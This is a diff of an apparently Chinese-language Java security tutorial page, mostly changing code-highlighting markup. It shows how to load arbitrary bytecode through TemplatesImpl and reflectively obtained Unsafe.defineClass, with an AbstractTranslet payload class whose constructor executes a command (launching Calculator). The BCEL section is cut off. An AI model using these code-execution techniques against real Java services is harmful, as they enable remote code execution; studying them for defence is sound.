+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>{
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exp2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>{
-        Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;-na&quot;</span>, <span class="hljs-string">&quot;Calculator&quot;</span>});
-    }
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exp2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">Exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;open&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-na&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Calculator&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
 
-    <span class="hljs-meta">@Override</span>
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>{
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
 
-    }
+    <span class="token punctuation">}</span>
 
-    <span class="hljs-meta">@Override</span>
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>{
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>
 
-    }
-}
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ul>
 <li>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#x4EE3;&#x7801;</li>
 </ul>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;
-<span class="hljs-keyword">import</span> java.io.IOException;
-<span class="hljs-keyword">import</span> java.lang.reflect.Field;
-<span class="hljs-keyword">import</span> java.nio.file.Files;
-<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException </span>{
-        <span class="hljs-keyword">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class&quot;</span>));
-        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
-        Class clazz = templates.getClass();
-        Field bytecodes = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);
-        Field name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);
-        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> name <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> _tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;_tfactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        bytecodes.setAccessible(<span class="hljs-keyword">true</span>);
-        name.setAccessible(<span class="hljs-keyword">true</span>);
-        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);
+        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        _tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes});
-        name.set(templates, <span class="hljs-string">&quot;d4m1ts&quot;</span>);
-        _tfactory.set(templates, <span class="hljs-keyword">new</span> TransformerFactoryImpl());
+        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;d4m1ts&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        _tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        templates.newTransformer();
+        templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    }
-}
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027160032003.png" data-lightbox="ae141ac0-b9e9-4e50-8e4d-dfb4b636f83c" data-title="image-20211027160032003"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027160032003.png" alt="image-20211027160032003"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027160032003.png" data-lightbox="4193470b-3c3f-4c4f-b994-1fe0c6b17a30" data-title="image-20211027160032003"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027160032003.png" alt="image-20211027160032003"></a></p>
 <h2 id="&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><a name="&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>2.4. &#x5229;&#x7528;Unsafe#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</h2>
 <p><code>Unsafe</code>&#x662F;&#x4F4D;&#x4E8E;<code>sun.misc</code>&#x5305;&#x4E0B;&#x7684;&#x4E00;&#x4E2A;&#x7C7B;&#xFF0C;&#x4E3B;&#x8981;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x4F4E;&#x7EA7;&#x522B;&#x3001;&#x4E0D;&#x5B89;&#x5168;&#x64CD;&#x4F5C;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5982;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x3001;&#x81EA;&#x4E3B;&#x7BA1;&#x7406;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7B49;&#xFF0C;&#x8FD9;&#x4E9B;&#x65B9;&#x6CD5;&#x5728;&#x63D0;&#x5347;Java&#x8FD0;&#x884C;&#x6548;&#x7387;&#x3001;&#x589E;&#x5F3A;Java&#x8BED;&#x8A00;&#x5E95;&#x5C42;&#x8D44;&#x6E90;&#x64CD;&#x4F5C;&#x80FD;&#x529B;&#x65B9;&#x9762;&#x8D77;&#x5230;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x4F5C;&#x7528;&#x3002;&#x4F7F;&#x7528;&#x8BE5;&#x7C7B;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x5E95;&#x5C42;&#x7684;&#x63A7;&#x5236;&#x6743;&#xFF0C;&#x8BE5;&#x7C7B;&#x5728;<code>sun.misc</code>&#x5305;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;<strong>BootstrapClassLoader</strong>&#x52A0;&#x8F7D;&#x7684;&#x3002;</p>
 <p>&#x800C;&#x5B83;&#x91CC;&#x9762;&#x4E5F;&#x5B58;&#x5728;&#x4E00;&#x4E2A;<code>defineClass</code>&#x65B9;&#x6CD5;&#xFF0C;&#x4E14;&#x4E3A;<code>public</code>&#x53EF;&#x76F4;&#x63A5;&#x8C03;&#x7528;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163022076.png" data-lightbox="9f7cd618-358d-4430-9b38-6b6ec8637e93" data-title="image-20211027163022076"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163022076.png" alt="image-20211027163022076"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163022076.png" data-lightbox="e9fca9d7-78dc-4306-a3bb-93e03751142f" data-title="image-20211027163022076"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163022076.png" alt="image-20211027163022076"></a></p>
 <p>&#x4F46;&#x56E0;&#x4E3A;<strong>Unsafe</strong>&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x662F;private&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;new&#x65B9;&#x5F0F;<strong>&#x5B9E;&#x4F8B;&#x5316;</strong>&#x83B7;&#x53D6;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x5B83;&#x7684;<code>getUnsafe()</code>&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x3002; &#x53C8;&#x56E0;&#x4E3A;<strong>Unsafe</strong>&#x662F;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#x5185;&#x5B58;&#x7684;&#xFF0C;&#x4E3A;&#x4E86;&#x5B89;&#x5168;&#x8D77;&#x89C1;&#xFF0C;Java&#x7684;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x4E3A;<strong>Unsafe</strong>&#x7684;&#x83B7;&#x53D6;&#x8BBE;&#x7F6E;&#x4E86;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x60F3;&#x8981;&#x83B7;&#x53D6;&#x5B83;&#x53EA;&#x80FD;&#x901A;&#x8FC7;Java&#x7684;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x6765;&#x83B7;&#x53D6;&#x3002;</p>
 <p>&#x56E0;&#x4E3A;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x8C03;&#x7528;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163816243.png" data-lightbox="eab1d94c-ccbd-4edb-951d-b2fc30fe3f84" data-title="image-20211027163816243"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163816243.png" alt="image-20211027163816243"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163816243.png" data-lightbox="35ef0cab-8405-4dad-b7e9-a77c5762f7f6" data-title="image-20211027163816243"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027163816243.png" alt="image-20211027163816243"></a></p>
 <p>&#x4F46;&#x524D;&#x9762;&#x4E5F;&#x8BF4;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8C03;&#x7528;</p>
 <p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#x53D1;&#x73B0;&#xFF0C;<code>theUnsafe</code>&#x4E3A;<code>Unsafe</code>&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x4EEC;&#x53CD;&#x5C04;&#x62FF;&#x5230;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#x4E86;</p>
 <p>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#x4EE3;&#x7801;</p>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> sun.misc.Unsafe;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">Unsafe</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">import</span> java.io.IOException;
-<span class="hljs-keyword">import</span> java.lang.reflect.Field;
-<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
-<span class="hljs-keyword">import</span> java.lang.reflect.Method;
-<span class="hljs-keyword">import</span> java.nio.file.Files;
-<span class="hljs-keyword">import</span> java.nio.file.Paths;
-<span class="hljs-keyword">import</span> java.security.ProtectionDomain;
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">ProtectionDomain</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>{
-        <span class="hljs-keyword">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;</span>));
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;
-        Field theUnsafe = unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);
-        theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);
-        Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="hljs-keyword">null</span>);
-        Class&lt;?&gt; exp = unsafe.defineClass(<span class="hljs-string">&quot;Exp&quot;</span>, classBytes, <span class="hljs-number">0</span>, classBytes.length, ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">null</span>);
-        exp.newInstance();
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Unsafe</span><span class="token punctuation">&gt;</span></span> unsafeClass <span class="token operator">=</span> <span class="token class-name">Unsafe</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> theUnsafe <span class="token operator">=</span> unsafeClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;theUnsafe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        theUnsafe<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Unsafe</span> unsafe <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span> theUnsafe<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> exp <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">&quot;Exp&quot;</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exp<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    }
-}
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027164550213.png" data-lightbox="fe737718-f474-4d7f-9a14-0194d190dc2a" data-title="image-20211027164550213"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027164550213.png" alt="image-20211027164550213"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027164550213.png" data-lightbox="44d34da6-6c50-4b7d-b04e-88b87c2f220f" data-title="image-20211027164550213"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027164550213.png" alt="image-20211027164550213"></a></p>
 <h2 id="&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><a name="&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>2.5. &#x5229;&#x7528;BCEL ClassLoader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</h2>
 <p>BCEL&#xFF08;Byte Code Engineering Library&#xFF09;&#x7684;&#x5168;&#x540D;&#x5E94;&#x8BE5;&#x662F;<code>Apache Commons BCEL</code>&#xFF0C;&#x5C5E;&#x4E8E;Apache Commons&#x9879;&#x76EE;&#x4E0B;&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x9879;&#x76EE;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x7CFB;&#x5217;&#x7528;&#x4E8E;&#x5206;&#x6790;&#x3001;&#x521B;&#x5EFA;&#x3001;&#x4FEE;&#x6539;Java Class&#x6587;&#x4EF6;&#x7684;API&#x3002;&#x4F46;&#x5176;&#x56E0;&#x4E3A;&#x88AB;<code>Apache Xalan</code>&#x6240;&#x4F7F;&#x7528;&#xFF0C;&#x800C;<code>Apache Xalan</code>&#x53C8;&#x662F;Java&#x5185;&#x90E8;&#x5BF9;&#x4E8E;JAXP&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6240;&#x4EE5;BCEL&#x4E5F;&#x88AB;&#x5305;&#x542B;&#x5728;&#x4E86;JDK&#x7684;&#x539F;&#x751F;&#x5E93;&#x4E2D;&#xFF0C;&#x4F4D;&#x4E8E;<code>com.sun.org.apache.bcel</code></p>
 <blockquote>
 <p>&#x867D;&#x7136;&#x8BF4;&#x5B83;&#x5305;&#x542B;&#x5728;&#x539F;&#x751F;&#x5E93;&#x5427;&#xFF0C;&#x4F46;&#x662F;&#x5728;jdk8u251&#x540E;&#xFF0C;<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>&#x5C31;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x5982;&#x679C;&#x5355;&#x72EC;&#x5F15;&#x5165;&#x4E86;&#x5B83;&#x7684;&#x4F9D;&#x8D56;&#xFF0C;&#x5219;&#x8FD8;&#x6709;ClassLoader&#xFF0C;&#x53C2;&#x8003; <a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" target="_blank">BCEL ClassLoader&#x53BB;&#x54EA;&#x4E86;</a></p>
 <p>&#x4F9D;&#x8D56;&#xFF1A;</p>
-<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bcel/bcel --&gt;</span>
